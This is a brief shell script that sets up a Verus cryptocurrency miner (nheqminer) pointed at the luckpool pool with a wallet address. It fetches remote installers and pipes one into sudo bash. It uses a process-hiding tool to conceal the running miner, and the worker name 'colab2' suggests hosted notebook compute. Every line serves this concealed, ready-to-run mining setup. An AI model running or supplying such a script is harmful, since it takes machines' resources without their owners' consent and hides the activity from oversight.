sudo apt update
clear
sudo apt install screen
screen -R xmr
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xf nheqminer-Linux-v0.8.2.tgz &&  tar -xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && sudo ph add nheqminer && apt install screen && screen 
sudo ./nheqminer -v -l na.luckpool.net:3956 -u RSC1ZnrrkGLuperMYD4Ta6FYnG7jFfuf4T.colab2 -t 10
